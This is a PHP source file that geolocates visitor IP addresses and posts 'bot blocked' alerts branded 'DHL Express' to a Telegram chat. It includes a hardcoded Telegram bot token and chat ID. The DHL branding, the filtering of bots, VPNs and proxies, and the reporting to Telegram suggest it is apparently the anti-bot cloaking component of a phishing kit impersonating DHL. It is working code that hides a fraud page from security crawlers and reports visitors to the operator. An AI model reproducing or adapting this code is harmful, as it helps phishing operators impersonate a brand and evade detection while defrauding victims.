<?php
// Telegram Bot Notification System for Anti-Bot Alerts
// Sends formatted alerts when bots are detected and blocked

class TelegramBotNotifier {
    private $bot_token;
    private $chat_id;
    
    public function __construct($bot_token, $chat_id) {
        $this->bot_token = $bot_token;
        $this->chat_id = $chat_id;
    }
    
    public function sendBotAlert($ip, $user_agent, $reason, $additional_info = []) {
        // Get detailed IP information
        $ip_info = $this->getIPInfo($ip);
        
        // Format the message
        $message = "🚫 DHL Express — bot blocked\n\n";
        $message .= "🛰️ ISP: " . ($ip_info['isp'] ?? 'Unknown') . "\n";
        $message .= "📡 IP Address: " . $ip . "\n";
        $message .= "🌐 Country: " . ($ip_info['country'] ?? 'Unknown') . "\n";
        $message .= "🌆 City: " . ($ip_info['city'] ?? 'Unknown') . "\n\n";
        $message .= "🤖 User Agent: " . substr($user_agent, 0, 100) . (strlen($user_agent) > 100 ? '...' : '') . "\n";
        $message .= "⚠️ Reason: " . $reason . "\n";
        
        // Add special indicators for VPN/Proxy
        if (strpos(strtolower($reason), 'vpn') !== false || strpos(strtolower($reason), 'proxy') !== false) {
            $message .= "🔒 Type: VPN/Proxy User\n";
        } elseif (strpos(strtolower($reason), 'bot') !== false) {
            $message .= "🤖 Type: Automated Bot\n";
        }
        $message .= "🕒 Time: " . date('Y-m-d H:i:s T') . "\n";
        
        // Add additional info if provided
        if (!empty($additional_info)) {
            $message .= "\n📊 Additional Info:\n";
            foreach ($additional_info as $key => $value) {
                $message .= "• " . ucfirst($key) . ": " . $value . "\n";
            }
        }
        
        $message .= "\n🛡️ DHL Express security";
        
        $this->sendToTelegram($message);
    }
    
    private function getIPInfo($ip) {
        $info = [
            'country' => 'Unknown',
            'city' => 'Unknown',
            'isp' => 'Unknown'
        ];
        
        try {
            // Try multiple IP info services
            $services = [
                "http://ip-api.com/json/{$ip}?fields=status,country,city,isp,org",
                "https://ipapi.co/{$ip}/json/",
                "https://ipinfo.io/{$ip}/json"
            ];
            
            foreach ($services as $service) {
                $context = stream_context_create([
                    'http' => [
                        'timeout' => 3,
                        'user_agent' => 'Mozilla/5.0 (compatible; DHL Express Security)'
                    ]
                ]);
                
                $response = @file_get_contents($service, false, $context);
                if ($response) {
                    $data = json_decode($response, true);
                    
                    if ($data) {
                        // Map different API responses
                        if (isset($data['country'])) {
                            $info['country'] = $data['country'];
                        } elseif (isset($data['country_name'])) {
                            $info['country'] = $data['country_name'];
                        }
                        
                        if (isset($data['city'])) {
                            $info['city'] = $data['city'];
                        }
                        
                        if (isset($data['isp'])) {
                            $info['isp'] = $data['isp'];
                        } elseif (isset($data['org'])) {
                            $info['isp'] = $data['org'];
                        } elseif (isset($data['organization'])) {
                            $info['isp'] = $data['organization'];
                        }
                        
                        break; // Stop after first successful response
                    }
                }
            }
        } catch (Exception $e) {
            // Fallback to basic info
            error_log("IP info lookup failed: " . $e->getMessage());
        }
        
        return $info;
    }
    
    private function sendToTelegram($message) {
        try {
            $url = "https://api.telegram.org/bot{$this->bot_token}/sendMessage";
            
            $data = [
                'chat_id' => $this->chat_id,
                'text' => $message,
                'parse_mode' => 'HTML',
                'disable_web_page_preview' => true
            ];
            
            $context = stream_context_create([
                'http' => [
                    'method' => 'POST',
                    'header' => 'Content-Type: application/x-www-form-urlencoded',
                    'content' => http_build_query($data),
                    'timeout' => 5
                ]
            ]);
            
            $result = @file_get_contents($url, false, $context);
            
            if ($result) {
                $response = json_decode($result, true);
                if (!$response['ok']) {
                    error_log("Telegram send failed: " . $result);
                }
            }
        } catch (Exception $e) {
            error_log("Telegram notification error: " . $e->getMessage());
        }
    }
    
    
    public function sendStatsAlert($stats) {
        $message = "📊 DHL Express — security report\n\n";
        $message .= "🚫 Bots Blocked: " . ($stats['blocked'] ?? 0) . "\n";
        $message .= "✅ Legitimate Users: " . ($stats['allowed'] ?? 0) . " ✅\n";
        $message .= "⏰ Time Period: " . ($stats['period'] ?? 'Last hour') . "\n";
        $message .= "🔥 Top Threat: " . ($stats['top_threat'] ?? 'None') . "\n\n";
        $message .= "🛡️ DHL Express security";
        
        $this->sendToTelegram($message);
    }
}

// Global notification function
function notifyBotBlocked($ip, $user_agent, $reason, $additional_info = []) {
    // Rate limiting: Only send 1 message per IP per 5 minutes
    $rate_limit_file = __DIR__ . '/notification_log.txt';
    $current_time = time();
    $rate_limit_window = 300; // 5 minutes
    
    // Check if we've sent a notification for this IP recently
    if (file_exists($rate_limit_file)) {
        $log_content = file_get_contents($rate_limit_file);
        $lines = explode("\n", trim($log_content));
        
        foreach ($lines as $line) {
            if (empty($line)) continue;
            list($timestamp, $logged_ip) = explode('|', $line);
            
            // If same IP within rate limit window, skip notification
            if ($logged_ip === $ip && ($current_time - $timestamp) < $rate_limit_window) {
                return; // Skip sending notification
            }
        }
    }
    
    // Log this notification
    $log_entry = $current_time . '|' . $ip . "\n";
    file_put_contents($rate_limit_file, $log_entry, FILE_APPEND | LOCK_EX);
    
    // Clean old entries (older than 1 hour)
    if (file_exists($rate_limit_file)) {
        $lines = explode("\n", trim(file_get_contents($rate_limit_file)));
        $valid_lines = [];
        
        foreach ($lines as $line) {
            if (empty($line)) continue;
            list($timestamp, $logged_ip) = explode('|', $line);
            if (($current_time - $timestamp) < 3600) { // Keep last hour
                $valid_lines[] = $line;
            }
        }
        
        file_put_contents($rate_limit_file, implode("\n", $valid_lines) . "\n", LOCK_EX);
    }
    
    // Direct bot configuration (replace with your new bot details)
    $BOT_TOKEN = '8296275721:AAHvjgZSY3qFMBL10xSTKqTfHRKuG-4Muf0';  // Put your new bot token here
    $CHAT_ID = '-4788631467';      // Put your new chat ID here
    
    if (!empty($BOT_TOKEN) && !empty($CHAT_ID)) {
        $notifier = new TelegramBotNotifier($BOT_TOKEN, $CHAT_ID);
        $notifier->sendBotAlert($ip, $user_agent, $reason, $additional_info);
    }
}

// No test functions - production only
